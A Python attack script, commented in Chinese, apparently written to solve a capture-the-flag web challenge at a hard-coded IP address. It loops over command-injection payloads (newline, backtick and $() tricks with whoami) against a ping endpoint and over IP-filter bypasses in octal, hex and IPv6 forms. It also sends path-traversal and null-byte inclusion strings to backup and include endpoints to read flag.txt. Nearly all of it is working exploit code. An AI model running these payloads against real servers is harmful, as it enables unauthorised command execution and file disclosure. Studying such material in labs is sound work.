import requests
import re
import os
import urllib.parse

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("尝试绕过IP验证")
print("="*70)

# 尝试各种绕过IP验证的方法
bypass_payloads = [
    # 使用换行符在IP后面
    ("127.0.0.1\nwhoami", "换行符"),
    ("127.0.0.1%0awhoami", "URL编码换行"),
    ("127.0.0.1%0d%0awhoami", "CR+LF"),
    ("127.0.0.1\r\nwhoami", "真实CR+LF"),
    
    # 使用制表符
    ("127.0.0.1\twhoami", "制表符"),
    ("127.0.0.1%09whoami", "URL编码制表符"),
    
    # 使用空字节
    ("127.0.0.1%00whoami", "空字节"),
    ("127.0.0.1\x00whoami", "真实空字节"),
    
    # 使用IP格式绕过
    ("0177.0.0.1", "八进制IP"),
    ("0x7f.0.0.1", "十六进制IP"),
    ("2130706433", "十进制IP"),
    ("0", "0"),
    ("127.1", "简短IP"),
    ("127.0.1", "简短IP2"),
    ("127.000.000.001", "完整IP"),
    
    # 使用IPv6格式
    ("::1", "IPv6 localhost"),
    ("::ffff:127.0.0.1", "IPv6映射"),
    
    # 使用localhost
    ("localhost", "localhost"),
    
    # 使用特殊的IP格式
    ("127.0.0.1.1", "额外数字"),
    ("127.0.0.1.", "末尾点"),
    ("127.0.0.1 ", "末尾空格"),
    
    # 尝试在IP后面添加命令，使用特殊分隔
    ("127.0.0.1`whoami`", "反引号"),
    ("127.0.0.1$(whoami)", "$()"),
    ("127.0.0.1{whoami}", "{}"),
    ("127.0.0.1<whoami>", "<>"),
]

for payload, desc in bypass_payloads:
    try:
        # 尝试直接使用URL（不经过params）
        encoded_payload = urllib.parse.quote(payload, safe='')
        r = session.get(f"{TARGET}/ping?host={encoded_payload}", timeout=15)
        
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                # 只显示有特殊响应的
                if "Blocked" not in content and len(content) > 50:
                    # 过滤ping输出
                    lines = content.split('\n')
                    non_ping = []
                    for line in lines:
                        line_lower = line.lower()
                        if 'ping' not in line_lower and '字节' not in line_lower and 'ttl' not in line_lower and '统计' not in line_lower and 'ms' not in line_lower and '127' not in line_lower:
                            if line.strip():
                                non_ping.append(line)
                    
                    if non_ping:
                        print(f"\n>>> {desc}: {payload}")
                        print(f"额外输出: {non_ping}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', '\n'.join(non_ping), re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试Backup绕过")
print("="*70)

# Backup的路径限制
backup_bypass = [
    # 尝试不同的路径分隔符
    ("F:/small peoject/python-lab/uploads", "正斜杠"),
    ("F:\\small peoject\\python-lab\\uploads", "反斜杠"),
    ("F:\\small peoject\\python-lab\\uploads\\", "末尾反斜杠"),
    
    # 尝试路径遍历
    ("F:\\small peoject\\python-lab\\uploads\\..\\flag.txt", "..遍历"),
    ("F:\\small peoject\\python-lab\\uploads/../flag.txt", "正斜杠.."),
    ("F:\\small peoject\\python-lab\\uploads%5c..%5cflag.txt", "编码.."),
    
    # 尝试使用换行符
    ("F:\\small peoject\\python-lab\\uploads\nwhoami", "换行符"),
    ("F:\\small peoject\\python-lab\\uploads%0awhoami", "编码换行"),
    
    # 尝试使用制表符
    ("F:\\small peoject\\python-lab\\uploads\twhoami", "制表符"),
    
    # 尝试读取flag文件
    ("F:\\small peoject\\python-lab\\uploads\\..\\..\\flag.txt", "双..遍历"),
    ("F:\\small peoject\\python-lab\\uploads/../../flag.txt", "正斜杠双.."),
]

for payload, desc in backup_bypass:
    try:
        encoded_payload = urllib.parse.quote(payload, safe='\\:/')
        r = session.get(f"{TARGET}/backup?path={encoded_payload}", timeout=15)
        
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                if len(content) > 20:
                    if "Blocked" not in content:
                        print(f"\n>>> {desc}: {payload}")
                        print(f"响应: {content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
    except:
        pass

print("\n" + "="*70)
print("测试文件包含绕过")
print("="*70)

include_bypass = [
    # 白名单页面
    ("welcome", "welcome"),
    ("rules", "rules"),
    
    # 尝试绕过白名单
    ("welcome/../flag.txt", "welcome+.."),
    ("welcome..flag.txt", "welcome.."),
    ("welcome%00flag.txt", "空字节"),
    ("welcome%5cflag.txt", "编码反斜杠"),
    
    # 尝试其他页面名
    ("flag", "flag"),
    ("secret", "secret"),
    ("admin", "admin"),
    ("home", "home"),
    ("index", "index"),
    ("main", "main"),
]

for payload, desc in include_bypass:
    try:
        r = session.get(f"{TARGET}/include", params={"page": payload}, timeout=15)
        
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                
                if len(content) > 10 and "Blocked" not in content:
                    print(f"\n>>> {desc}: {payload}")
                    print(f"响应: {content[:300]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
    except:
        pass

print("\n" + "="*70)
print("检查所有JS文件")
print("="*70)

js_paths = [
    "/style.css",
    "/script.js",
    "/main.js",
    "/app.js",
    "/static/style.css",
    "/static/script.js",
    "/js/main.js",
    "/js/app.js",
]

for path in js_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"\n>>> {path}")
            print(f"内容: {r.text[:300]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

print("\n测试完成")